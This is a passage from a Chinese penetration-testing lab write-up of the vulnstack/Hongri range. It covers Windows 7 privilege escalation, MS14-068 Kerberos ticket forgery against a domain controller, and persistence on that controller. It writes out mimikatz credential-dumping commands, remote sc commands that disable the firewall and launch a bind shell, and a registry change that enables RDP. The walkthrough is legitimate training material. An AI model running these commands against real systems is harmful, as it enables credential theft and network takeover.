<h3 id="win7提权"><a class="markdownIt-Anchor" href="#win7提权">#</a> Win7 提权</h3>
<p>先 systeminfo 拿到补丁列表，使用 http://bugs.hacking8.com/tiquan/ 直接查询可用 exp，发现 MS16-135 可用，直接梼杌 MS16-135 提权一把梭</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550478.png" alt="image-20211114004439133" class="lazyload"></p>
<p>拿到新 shell，尝试用猕猴桃拿密码</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550982.png" alt="image-20211114004938173" class="lazyload"></p>
<p><code>mimikatz sekurlsa::logonpasswords</code>  拿到明文密码</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550669.png" alt="image-20211114005145157" class="lazyload"></p>
<h3 id="win7打域控"><a class="markdownIt-Anchor" href="#win7打域控">#</a> Win7 打域控</h3>
<p>同样的，使用 http://bugs.hacking8.com/tiquan/ 发现可以用 MS14-068，工具：<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
<p>用收集到的 sid、成员名、密码伪造票据</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">//ms14<span class="hljs-string">-068</span>.exe -u 域成员名@域名.com -s 域成员sid -d 域控制器ip地址 -p 域成员密码<br><br>ms14<span class="hljs-string">-068</span>.exe -u douser@DEMO.com -s S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-979886063</span><span class="hljs-string">-1111900045</span><span class="hljs-string">-1414766810</span><span class="hljs-string">-1107</span> -d 192.168.183.130 -p Dotest123<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550909.png" alt="image-20211114010319666" class="lazyload"></p>
<p>用猕猴桃注入票据</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">mimikatz kerberos::purge         <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br>mimikatz kerberos::list          <span class="hljs-comment">//查看当前机器凭证</span><br>mimikatz kerberos::ptc <span class="hljs-params">&lt;生成的票据文件&gt;</span>   <span class="hljs-comment">//将票据注入到内存中</span><br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550025.png" alt="image-20211114010623765" class="lazyload"></p>
<p>尝试查看域控的 C 盘</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">net</span> use \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N<br><span class="hljs-attribute">dir</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N\c$<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550134.png" alt="image-20211114010832260" class="lazyload"></p>
<h3 id="域控维权"><a class="markdownIt-Anchor" href="#域控维权">#</a> 域控维权</h3>
<p>再生成一个 CS 马，通过 win7 传到 DC 上</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550189.png" alt="image-20211114011638641" class="lazyload"></p>
<p>关掉 DC 的防火墙</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sc</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N create unablefirewall binpath= <span class="hljs-string">&quot;netsh advfirewall set allprofiles state off&quot;</span><br><br><span class="hljs-attribute">sc</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N start unablefirewall<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550638.png" alt="image-20211114011840038" class="lazyload"></p>
<p>执行 shell</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sc</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N create bindshell binpath= <span class="hljs-string">&quot;c:\cshell2.exe&quot;</span><br><span class="hljs-attribute">sc</span> \\WIN-ENS<span class="hljs-number">2</span>VR<span class="hljs-number">5</span>TR<span class="hljs-number">3</span>N start bindshell<br></code></pre></td></tr></table></figure>
<p>拿到 130 的新 shell</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550887.png" alt="image-20211114012104545" class="lazyload"></p>
<p>猕猴桃拿密码</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz privilege::debug<br>mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550717.png" alt="image-20211114012906263" class="lazyload"></p>
<p>拿到明文密码</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550550.png" alt="image-20211114013013491" class="lazyload"></p>
<p>开启 3389</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 0 /</span>f<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550855.png" alt="image-20211114013625435" class="lazyload"></p>
<p>用 kali 的 RDP 工具，走之前的 ew 代理连接</p>
<p><code>proxychains4 rdesktop 192.168.183.130</code></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551462.png" alt="image-20211114014338299" class="lazyload"></p>
<p>或者免去以上步骤，直接 CS 的 VNC</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551829.png" alt="image-20211114013338451" class="lazyload"></p>
<h2 id="reference"><a class="markdownIt-Anchor" href="#reference">#</a> Reference</h2>
<p><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/271892.html">https://www.freebuf.com/articles/web/271892.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/oliiiflorrr/topics/1144804">https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</a></p>
<p><a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangshengxiang/p/11842326.html">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>
<p><a target="_blank" rel="noopener" href="http://www.hackdig.com/09/hack-492089.htm">http://www.hackdig.com/09/hack-492089.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/116059592">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p>

  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>本文作者：</strong>M1N<br>
        <strong>本文链接：</strong><a href="http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/" title="http:&#x2F;&#x2F;blog.m1n.me&#x2F;2021&#x2F;11&#x2F;16&#x2F;%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;blog.m1n.me&#x2F;2021&#x2F;11&#x2F;16&#x2F;%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0&#x2F;</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
    
        <a class="nexmoefont icon-appstore-fill -link" href="/categories/Writeup/">Writeup</a>
    
    
</div>

  
      <div class="nexmoe-post-footer">
          <section class="nexmoe-comment">
    <div class="valine"></div>
<script src='https://cdn.jsdelivr.net/npm/valine'></script>
<script>
    // 使用方法 https://valine.js.org/quickstart.html
    new Valine({
        el: '.valine',
        appId: 'UzwkiNx4XBeK7X1PnP8hQnJd-gzGzoHsz',
        appKey: 'mDiKv9RewzE8lKmFySr1XEkH'
    })
</script>
</section>
      </div>
  
</div>
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text"> 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text"> 外网打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2001%E7%AB%AF%E5%8F%A3struct2"><span class="toc-number">2.1.</span> <span class="toc-text"> 2001 端口 Struct2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2002%E7%AB%AF%E5%8F%A3tomcat"><span class="toc-number">2.2.</span> <span class="toc-text"> 2002 端口 Tomcat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2003%E7%AB%AF%E5%8F%A3phpmyadmin-481"><span class="toc-number">2.3.</span> <span class="toc-text"> 2003 端口 phpMyAdmin 4.8.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%80%83%E9%80%B82002%E7%AB%AF%E5%8F%A3%E7%9A%84tomcat"><span class="toc-number">3.</span> <span class="toc-text"> Docker 逃逸（2002 端口的 Tomcat）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%9C%A8docker%E9%87%8C"><span class="toc-number">3.1.</span> <span class="toc-text"> 如何判断是否在 Docker 里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95dirtycow%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">3.2.</span> <span class="toc-text"> 尝试 DirtyCow 漏洞逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9Ecve-2019-5736"><span class="toc-number">3.3.</span> <span class="toc-text"> 尝试 runC 容器逃逸漏洞（CVE-2019-5736）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">3.4.</span> <span class="toc-text"> 尝试特权模式逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%9D%A5%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.4.1.</span> <span class="toc-text"> 尝试写定时任务来反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%86%99ssh%E5%85%AC%E9%92%A5%E6%9D%A5%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.4.2.</span> <span class="toc-text"> 尝试写.ssh 公钥来连接</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text"> 内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0"><span class="toc-number">4.1.</span> <span class="toc-text"> 传🐎</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#msf"><span class="toc-number">4.1.1.</span> <span class="toc-text"> MSF🐎</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">4.2.</span> <span class="toc-text"> 代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ew%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 使用 ew 代理转发</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ubuntu%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.3.</span> <span class="toc-text"> Ubuntu 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.4.</span> <span class="toc-text"> Win7 权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.5.</span> <span class="toc-text"> Win7 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E6%8F%90%E6%9D%83"><span class="toc-number">4.6.</span> <span class="toc-text"> Win7 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#win7%E6%89%93%E5%9F%9F%E6%8E%A7"><span class="toc-number">4.7.</span> <span class="toc-text"> Win7 打域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E7%BB%B4%E6%9D%83"><span class="toc-number">4.8.</span> <span class="toc-text"> 域控维权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">5.</span> <span class="toc-text"> Reference</span></a></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
     
    <div id="nexmoe-search-space">
        <div class="search-container">
            <div class="search-header">
                <div class="search-input-container">
                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
                </div>
                <a class="search-close" onclick="sclose();">×</a>
            </div>
            <div class="search-body"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

 

<script async src="/js/app.js?v=1641283248168"></script>



<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
<script>
	$(".justified-gallery").justifiedGallery({
		rowHeight: 160,
		margins: 10,
	});
</script>


    


    <!-- CNZZ Analytics -->
<div hidden>
    <script src="//s95.cnzz.com/z_stat.php?id=1280753295&web_id=1280753295" language="JavaScript"></script>
</div>




    <!-- baidu Analytics -->
<script>
    var _hmt = _hmt || [];
    (function() {var hm = document.createElement('script');
    hm.src = 'https://hm.baidu.com/hm.js?f254d2c7295bf4323b22dfe1f8760f82';
    var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

</body>

</html>
